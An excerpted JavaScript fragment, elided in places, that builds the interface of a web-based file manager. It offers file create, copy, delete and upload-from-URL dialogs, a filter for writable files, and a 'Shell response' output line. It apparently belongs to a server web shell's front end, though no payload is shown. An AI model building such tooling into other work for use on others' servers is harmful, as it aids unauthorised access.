    ...
    function show_box(t, ct){
        hide_box();
        box = "<div id='box' class='box'><p id='boxtitle' class='boxtitle'>" +
                t + "<span onclick='hide_box();' class='boxclose floatRight'>x</span></p><div class='boxcontent'>" +
                ct + "</div></div>";
        append("content", box);
    ...
    function showUI(a, o){
        ...
        if (a === "del"){
            ...
            if (a === "cfile") title = "Create file";
        }
    
        ct = "<table class='boxtbl'>" +
                "<tr><td class='colFit'>" + text + "</td><td><input class='' name='uival' id='uival' value='" + path + "' type='text' " + disabled + " /></td></tr>" +
    ...
    function showUISec(a){
        ...
        if (a === "comp"){
            ...
            title = "Copy";
            uival = "<tr><td class='colFit'>To</td><td><input class='' name='uival' id='uival' value='' type='text' /></td></tr>";
    ...
    function showFMExtras(){
        ct = "<form name='fmexs'>" +
             "<table class='boxtbl'>" +
                "<tr><td class='colFit'>Show only" +
                "<select class='theme' id='fm_mode' name='fm_mode'  ><option value='all'>All</option><option value='file'>File</option><option value='dir'>Dir</option></select>" +
                "<tr><td class='colFit'>Only writable" +
                "<input id='fm_onlyW' name='fm_onlyW' value='1' type='checkbox' /></td><td>&nbsp;</td></tr>" +
                "<tr><td class='colFit'>Recursive listing" + 
                "<input id='fm_rec' name='fm_rec' value='1' type='checkbox' /></td><td>&nbsp;</td></tr>" +
                "<tr><td colspan='2'><span class='button' onclick='ajaxLoad(serialize(d.forms[1]));'>Show</span></td></tr>" +
             "</table>" +
             "<input id='me' name='me' type='hidden' value='file' /><input id='dir' name='dir' type='hidden' value='" + d.getElementById("base").value + "' />" +
             "</form>";
        
        show_box("Show extra tools", ct);
    }
    
    function processUI(a, o, n){
        if ((a === "del" || a === "rdel") && config.checkBDel) {
    ...
    function up(){
        ct = "<form name='up' enctype='multipart/form-data' method='post' action='" + targeturl + "'>" +
                ...
                "<table class='boxtbl'>" +
                    "<tr><td class='colFit'>URL</td><td><input class='' name='uival' id='uival' value='' type='text' /></td></tr>" +
                    "<tr><td class='colFit'>File</td><td><input id='upf' name='upf' value='' type='file' /></td></tr>" +
                    "<tr><td colspan='2'><span class='button' onclick='upaction()'>Go!</span></td></tr>" +
                "</table>" +
             "</form>";
        show_box("Upload", ct);
    }
    ...
    function uiupdate(t){
        ajax(serialize(d.forms[t]), function(r){
            ...
            append("uires", "Shell response: " + r + "<br>\n");
